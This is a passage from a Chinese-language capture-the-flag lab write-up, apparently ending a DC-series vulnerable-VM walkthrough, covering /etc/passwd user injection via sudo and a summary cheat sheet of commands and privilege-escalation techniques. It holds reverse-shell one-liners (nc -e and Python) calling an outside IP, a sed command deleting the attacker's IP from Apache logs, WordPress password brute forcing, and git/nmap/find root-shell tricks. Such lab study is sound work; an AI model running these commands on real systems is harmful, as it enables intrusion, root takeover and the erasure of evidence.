echo 'admin:$1$123$Ok9FhQy4YioYZeBPwQgm3/:0:0:admin:/root:/bin/bash' > /tmp/user.txt
```

然后执行这个文件，还是提示没有权限

```
/opt/devstuff/dist/test/test /tmp/user.txt /etc/passwd
```

提示没有权限

## sudo配合/etc/passwd追加用户提权

加上sudo，为什么加上sudo就可以了，因为`sudo -l`中包含了这个文件，所以sudo可以应用到这个文件,sudo可以让你以root权限执行文件

`sudo` 让你以 **root 权限**执行命令

root 对 `/etc/passwd` 有完全读写权限

`sudo -l` 显示该命令被允许执行

```
sudo /opt/devstuff/dist/test/test /tmp/user.txt /etc/passwd
```

可以看到成功追加

![](C:/Users/Administrator/myBlog/source/image/ISW-86.png)

su切换用户即可

```
su admin
admin

cd /root
ls
cat theflag.txt
```

# **总结**

## **本系列常用的命令**

```
# nc
nc 111.111.111.111 4444 -e /bin/bash
nc -lvvp 4444
 
# python
python -c "import pty; pty.spwan('/bin/bash')" # 创建交互式终端
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.254.132",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' # python反弹sehll
python -m http.server # 开启一个微型的http服务，通常用于文件传输

# find
find / -perm -4000 -print 2>/dev/null # 查找SUID文件 
find / -type f -user alice 2>/dev/null # 查找所有alice拥有的文件
find / -type d -user alice 2>/dev/null # 查找所有alice拥有的文件夹

compgen -c # 查找可用命令

# sudo
sudo -l

# sed
sed -i '/192.168.209.1/d' /var/log/apache2/access.log # 这条命令会直接在原文件中删除所有包含`192.168.209.1`的行。`-i`选项表示直接修改文件。/d这里表示清除209段下的所有ip地址日志

# nmap
nmap -sS 111.111.111.111 -p- # 全端口SYN扫描
nmap -sSV 111.111.111.111 -p- -O # 全端口SYN扫描，并扫描操作系统，以及每个端口服务的版本信息。
nmap -sP 192.168.209.0/24  # -sP这个选项是用来指定一个主机发现方法。

# whatweb
whatweb -v 192.168.209.157 # 找到目标cms的版本和其他信息。

# wpscan
wpscan --url http://dc-2/-e u # 枚举当前wordpress中所有可能的用户名
wpscan --url http://dc-2/-U users.txt -P passwd.txt # 使用wpscan爆破wordpress后台密码

# msf 
run -j # 将会话监听在后台
payload/php/meterpreter/reverse_tcp # php反弹shell的payload

# mysql
select * from users\G; # 格式化显示的数据，变得好看一点

# searchsploit
searchsploit content # 检索指定内容的漏洞
searchsploit -p 编号 # 根据exp编号找到exp所在的位置

# 本系列用到的一些文件
/etc/passwd # 存储用户信息
/var/log/apache2/access.log # apache访问日志文件
/var/log/apache2/error.log # apache错误日志文件
/usr/share/wordlists/rockyou.txt # kali中的强大密码字典
/etc/knockd.conf # knockd（开门）服务的配置文件
/etc/shells # 可用的shell
/etc/os-release # 操作系统信息

# sqlmap
略
```

## **本系列提权方式**

### **git提权**

```
sudo git help config
!/bin/bash 或 !'sh' #完成提权 
## 或者
sudo git -p help 
!/bin/bash #输入!/bin/bash 即可打开一个用户为root的shell
```

### **nmap+sudo提权**

```
echo "os.execute('/bin/bash')" > /tmp/TF
sudo nmap --script=/tmp/TF
```

### **Exim4邮件服务器的本地提权**

指定版本的exim邮件服务器才会有这个漏洞，利用exp

### **Knockd服务的隐藏端口开启漏洞**

如果存在knockd服务。

该服务通过动态的添加iptables规则来隐藏系统开启的服务，使用自定义的一系列序列号来"敲门"，使系统开启需要访问的服务端口，才能对外访问。

不使用时，再使用自定义的序列号来"关门"，将端口关闭，不对外监听。进一步提升了服务和系统的安全

//配置文件路径 默认配置文件是：/etc/knockd.conf

利用nmap访问指定端口后，此时就能开启/关闭配置的指定端口服务

### **/etc/passwd提权**

`/etc/passwd`文件提权，攻击者需要能够修改该文件，并添加或修改一个用户条目，使其具有root权限。通常直接复制root用户的信息，修改关键信息，比如

```
# root源信息
root:x:0:0:root:/root:/bin/bash
# 修改后，x为密码，留x则密码保存在/etc/shadow文件中，不留则就在这个/etc/passwd中
admin:$1$123$Ok9FhQy4YioYZeBPwQgm3/:0:0:admin:/root:/bin/bash
```

### **rbash逃逸**

```
tom@DC-2:~$ export PATH=$PATH:/bin/   # 直接添加环境变量
rbash: PATH: readonly variable        # rbash
tom@DC-2:~$ BASH_CMDS[a]=/bin/sh;a    # 把/bin/sh给a
$ /bin/bash
tom@DC-2:~$ su        # 这里修改了BASH_CMDS的值后并不能直接使用su命令
bash: su: command not found   
tom@DC-2:~$ export PATH=$PATH:/bin/   # 添加环境变量
tom@DC-2:~$ su jerry      # su 正常使用
Password:
jerry@DC-2:/home/tom$ 
```

### **EXP提权**

使用searchsploit检索漏洞exp即可

### **find提权**

```
find / -exec "/bin/sh" ;
```



